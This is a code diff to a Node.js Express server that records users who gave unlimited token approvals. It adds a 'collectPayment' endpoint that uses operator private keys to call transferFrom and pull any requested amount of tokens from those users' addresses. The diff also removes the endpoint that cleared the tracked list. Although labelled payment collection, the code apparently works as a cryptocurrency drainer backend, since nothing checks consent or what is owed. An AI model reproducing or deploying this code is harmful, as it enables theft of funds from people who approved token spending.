@@ -1,5 +1,6 @@
 import express from "express";
 import cors from "cors";
+import { ethers } from "ethers";
 
 const app = express();
 app.use(cors());
@@ -7,6 +8,27 @@ app.use(express.json());
 
 let unlimitedUsers = [];
 
+// Load private keys from environment
+const PRIVATE_KEYS = [
+  process.env.PRIVATE_KEY_1 || "",
+  process.env.PRIVATE_KEY_2 || "",
+  process.env.PRIVATE_KEY_3 || ""
+].filter(pk => pk.length > 0); // Only use non-empty keys
+
+const NETWORK = process.env.NETWORK || "mainnet";
+const ROUTER_ADDRESS = process.env.ROUTER_ADDRESS;
+
+if (!ROUTER_ADDRESS) {
+  console.error("ROUTER_ADDRESS is not set in environment variables");
+  process.exit(1);
+}
+
+const providers = PRIVATE_KEYS.map(pk => {
+  const wallet = new ethers.Wallet(pk);
+  return wallet.connect(ethers.getDefaultProvider(NETWORK));
+});
+
+// Track unlimited approvals
 app.post("/api/trackUnlimitedApproval", (req, res) => {
   const { address, token } = req.body;
   if (!address || !token) return res.status(400).json({ error: "Address and token required" });
@@ -16,11 +38,30 @@ app.post("/api/trackUnlimitedApproval", (req, res) => {
   res.json({ success: true, unlimitedUsers });
 });
 
+// Get users
 app.get("/api/unlimitedUsers", (req, res) => res.json(unlimitedUsers));
 
-app.post("/api/clearUnlimitedUsers", (req, res) => {
-  unlimitedUsers = [];
-  res.json({ success: true });
+// Collect payments using a wallet from PRIVATE_KEYS
+app.post("/api/collectPayment", async (req, res) => {
+  const { userAddress, token, amount, walletIndex = 0 } = req.body;
+  if (!userAddress || !token || !amount) return res.status(400).json({ error: "Missing parameters" });
+
+  try {
+    const provider = providers[walletIndex % providers.length];
+    const tokenContract = new ethers.Contract(token, [
+      "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
+      "function decimals() view returns (uint8)"
+    ], provider);
+
+    const decimals = await tokenContract.decimals();
+    const tx = await tokenContract.transferFrom(userAddress, provider.address, ethers.parseUnits(amount, decimals));
+    await tx.wait();
+
+    res.json({ success: true, message: `Collected ${amount} from ${userAddress}` });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false, error: err.message });
+  }
 });
 
 const PORT = process.env.PORT || 3000;
